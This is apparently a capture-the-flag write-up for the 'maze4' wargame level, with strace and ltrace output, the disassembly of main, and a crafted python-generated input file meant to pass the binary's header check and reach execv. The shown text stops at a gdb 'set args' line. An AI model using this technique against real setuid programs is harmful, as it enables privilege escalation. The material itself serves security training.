As always first step is to execute the binary file. With and without parameters.

```assembly
maze4@maze:/maze$ ./maze4
usage: ./maze4 file2check
maze4@maze:/maze$ ./maze4 aaa
open: No such file or directory
maze4@maze:/maze$ ./maze4 /bin/sh
file not executed

```

seems interesting lets do ltrace and strace on that with and without parameters.

strace:

```assembly
maze4@maze:/maze$ ltrace ./maze4 aaa
__libc_start_main(0x80485fb, 2, 0xffffd794, 0x8048730 <unfinished ...>
open("aaa", 0, 036777230420)                     = -1
perror("open"open: No such file or directory
)                                   = <void>
exit(-1 <no return ...>
+++ exited (status 255) +++
maze4@maze:/maze$ strace ./maze4
execve("./maze4", ["./maze4"], [/* 18 vars */]) = 0
strace: [ Process PID=5570 runs in 32 bit mode. ]
brk(NULL)                               = 0x804a000
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
close(3)                                = 0
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
munmap(0xf7fc9000, 36357)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
brk(NULL)                               = 0x804a000
brk(0x806b000)                          = 0x806b000
write(1, "usage: ./maze4 file2check\n", 26usage: ./maze4 file2check
) = 26
exit_group(-1)                          = ?
+++ exited with 255 +++
maze4@maze:/maze$ strace ./maze4 aaaa
execve("./maze4", ["./maze4", "aaaa"], [/* 18 vars */]) = 0
strace: [ Process PID=5573 runs in 32 bit mode. ]
brk(NULL)                               = 0x804a000
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
close(3)                                = 0
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
munmap(0xf7fc9000, 36357)               = 0
open("aaaa", O_RDONLY)                  = -1 ENOENT (No such file or directory)
dup(2)                                  = 3
fcntl64(3, F_GETFL)                     = 0x8002 (flags O_RDWR|O_LARGEFILE)
brk(NULL)                               = 0x804a000
brk(0x806b000)                          = 0x806b000
fstat64(3, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
write(3, "open: No such file or directory\n", 32open: No such file or directory
) = 32
close(3)                                = 0
exit_group(-1)                          = ?
+++ exited with 255 +++

```

ltrace: 

```assembly
maze4@maze:/maze$ ltrace ./maze4 
__libc_start_main(0x80485fb, 1, 0xffffd794, 0x8048730 <unfinished ...>
printf("usage: %s file2check\n", "./maze4"usage: ./maze4 file2check
)      = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
maze4@maze:/maze$ ltrace ./maze4 aaa
__libc_start_main(0x80485fb, 2, 0xffffd794, 0x8048730 <unfinished ...>
open("aaa", 0, 036777230420)                     = -1
perror("open"open: No such file or directory
)                                   = <void>
exit(-1 <no return ...>
+++ exited (status 255) +++
```

So, it shows that without parameters this elf file just prints the string but with parameters in tries to open a file with the given string.

Now create a file on a temporary folder and pass that directory as parameter. to check what happens.

```
maze4@maze:/maze$ mkdir /tmp/tomal_maze4
maze4@maze:/maze$ cd /tmp/tomal_maze4
maze4@maze:/tmp/tomal_maze4$ echo tomal >temp
maze4@maze:/tmp/tomal_maze4$ ls
temp
maze4@maze:/tmp/tomal_maze4$ cat temp
tomal
maze4@maze:/tmp/tomal_maze4$ 

```

So the parameter should be /tmp/tomal_maze4/temp

```assembly
maze4@maze:/maze$ ltrace ./maze4 /tmp/tomal_maze4/temp
__libc_start_main(0x80485fb, 2, 0xffffd784, 0x8048730 <unfinished ...>
open("/tmp/tomal_maze4/temp", 0, 036777230420)   = 3
__xstat(3, "/tmp/tomal_maze4/temp", 0xffffd638)  = 0
read(3, "tomal\n", 52)                           = 6
lseek(3, 134514513, 0)                           = 134514513
read(3, "", 32)                                  = 0
fwrite("file not executed\n", 1, 18, 0xf7fc5cc0file not executed
) = 18
close(3)                                         = 0
+++ exited (status 0) +++

```

We can see from above it first reads 52 bytes from the file and executes lseek() : lseek is used to change position inside the file for the next read() or write() operation. [*For more info: http://man7.org/linux/man-pages/man2/lseek.2.html* ] Then it reads 32 bytes again.

set the following content and check again *echo $(python -c 'print "A"52+"B"4+"C"*32') > temp*

```assembly
maze4@maze:/tmp/tomal_maze4$ cat temp
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

```

```assembly
maze4@maze:/tmp/tomal_maze4$ ltrace /maze/maze4 /tmp/tomal_maze4/temp
__libc_start_main(0x80485fb, 2, 0xffffd774, 0x8048730 <unfinished ...>
open("/tmp/tomal_maze4/temp", 0, 036777230420)   = 3
__xstat(3, "/tmp/tomal_maze4/temp", 0xffffd628)  = 0
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 52) = 52
lseek(3, 1094795585, 0)                          = 1094795585
read(3, "", 32)                                  = 0
fwrite("file not executed\n", 1, 18, 0xf7fc5cc0file not executed
) = 18
close(3)                                         = 0
+++ exited (status 0) +++

```

Hmm....

lets check the disassembly code.

```assembly
0x080485fb <+0>:	push   %ebp
   0x080485fc <+1>:	mov    %esp,%ebp
   0x080485fe <+3>:	sub    $0xb0,%esp
   0x08048604 <+9>:	cmpl   $0x2,0x8(%ebp)
   0x08048608 <+13>:	je     0x8048624 <main+41>
   0x0804860a <+15>:	mov    0xc(%ebp),%eax
   0x0804860d <+18>:	mov    (%eax),%eax
   0x0804860f <+20>:	push   %eax
   0x08048610 <+21>:	push   $0x80487e0
   0x08048615 <+26>:	call   0x8048440 <printf@plt>
   0x0804861a <+31>:	add    $0x8,%esp
   0x0804861d <+34>:	push   $0xffffffff
   0x0804861f <+36>:	call   0x80484a0 <exit@plt>
   0x08048624 <+41>:	mov    0xc(%ebp),%eax
   0x08048627 <+44>:	add    $0x4,%eax
   0x0804862a <+47>:	mov    (%eax),%eax
   0x0804862c <+49>:	push   $0x0
   0x0804862e <+51>:	push   %eax
   0x0804862f <+52>:	call   0x80484b0 <open@plt>
   0x08048634 <+57>:	add    $0x8,%esp
   0x08048637 <+60>:	mov    %eax,-0x4(%ebp)
   0x0804863a <+63>:	cmpl   $0x0,-0x4(%ebp)
---Type <return> to continue, or q <return> to quit---
   0x0804863e <+67>:	jns    0x8048654 <main+89>
   0x08048640 <+69>:	push   $0x80487f6
   0x08048645 <+74>:	call   0x8048470 <perror@plt>
   0x0804864a <+79>:	add    $0x4,%esp
   0x0804864d <+82>:	push   $0xffffffff
   0x0804864f <+84>:	call   0x80484a0 <exit@plt>
   0x08048654 <+89>:	mov    0xc(%ebp),%eax
   0x08048657 <+92>:	add    $0x4,%eax
   0x0804865a <+95>:	mov    (%eax),%eax
   0x0804865c <+97>:	lea    -0xb0(%ebp),%edx
   0x08048662 <+103>:	push   %edx
   0x08048663 <+104>:	push   %eax
   0x08048664 <+105>:	call   0x80487a0 <stat>
   0x08048669 <+110>:	add    $0x8,%esp
   0x0804866c <+113>:	test   %eax,%eax
   0x0804866e <+115>:	jns    0x8048684 <main+137>
   0x08048670 <+117>:	push   $0x80487fb
   0x08048675 <+122>:	call   0x8048470 <perror@plt>
   0x0804867a <+127>:	add    $0x4,%esp
   0x0804867d <+130>:	push   $0xffffffff
   0x0804867f <+132>:	call   0x80484a0 <exit@plt>
   0x08048684 <+137>:	push   $0x34
   0x08048686 <+139>:	lea    -0x38(%ebp),%eax
---Type <return> to continue, or q <return> to quit---
   0x08048689 <+142>:	push   %eax
   0x0804868a <+143>:	pushl  -0x4(%ebp)
   0x0804868d <+146>:	call   0x8048430 <read@plt>
   0x08048692 <+151>:	add    $0xc,%esp
   0x08048695 <+154>:	mov    -0x1c(%ebp),%eax
   0x08048698 <+157>:	push   $0x0
   0x0804869a <+159>:	push   %eax
   0x0804869b <+160>:	pushl  -0x4(%ebp)
   0x0804869e <+163>:	call   0x8048450 <lseek@plt>
   0x080486a3 <+168>:	add    $0xc,%esp
   0x080486a6 <+171>:	push   $0x20
   0x080486a8 <+173>:	lea    -0x58(%ebp),%eax
   0x080486ab <+176>:	push   %eax
   0x080486ac <+177>:	pushl  -0x4(%ebp)
   0x080486af <+180>:	call   0x8048430 <read@plt>
   0x080486b4 <+185>:	add    $0xc,%esp
   0x080486b7 <+188>:	mov    -0x4c(%ebp),%eax
   0x080486ba <+191>:	movzbl -0x31(%ebp),%edx
   0x080486be <+195>:	movzbl %dl,%ecx
   0x080486c1 <+198>:	movzbl -0x30(%ebp),%edx
   0x080486c5 <+202>:	movzbl %dl,%edx
   0x080486c8 <+205>:	imul   %ecx,%edx
   0x080486cb <+208>:	cmp    %edx,%eax
---Type <return> to continue, or q <return> to quit---
   0x080486cd <+210>:	jne    0x80486fa <main+255>
   0x080486cf <+212>:	mov    -0x84(%ebp),%eax
   0x080486d5 <+218>:	cmp    $0x77,%eax
   0x080486d8 <+221>:	jg     0x80486fa <main+255>
   0x080486da <+223>:	push   $0x8048800
   0x080486df <+228>:	call   0x8048490 <puts@plt>
   0x080486e4 <+233>:	add    $0x4,%esp
   0x080486e7 <+236>:	mov    0xc(%ebp),%eax
   0x080486ea <+239>:	add    $0x4,%eax
   0x080486ed <+242>:	mov    (%eax),%eax
   0x080486ef <+244>:	push   $0x0
   0x080486f1 <+246>:	push   %eax
   0x080486f2 <+247>:	call   0x80484d0 <execv@plt>
   0x080486f7 <+252>:	add    $0x8,%esp
   0x080486fa <+255>:	mov    0x8049aa8,%eax
   0x080486ff <+260>:	push   %eax
   0x08048700 <+261>:	push   $0x12
   0x08048702 <+263>:	push   $0x1
   0x08048704 <+265>:	push   $0x8048816
   0x08048709 <+270>:	call   0x8048480 <fwrite@plt>
   0x0804870e <+275>:	add    $0x10,%esp
   0x08048711 <+278>:	pushl  -0x4(%ebp)
   0x08048714 <+281>:	call   0x80484e0 <close@plt>
---Type <return> to continue, or q <return> to quit---
   0x08048719 <+286>:	add    $0x4,%esp
   0x0804871c <+289>:	mov    $0x0,%eax
   0x08048721 <+294>:	leave  
   0x08048722 <+295>:	ret    
```

Debug the main function sequentially. You  will see interesting things from address 0x08048684. 

(python -c 'print "ABCDEFG"+"\x01\x01"+"JKLMNOPQRSTUVWXYZab"+"\x20\x00\x00\x00"+"cdefghijklmn"+"\x01\x00\x00\x00"+"stuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"+"Z"*100') >temp

set args /tmp/tomal_maze4/temp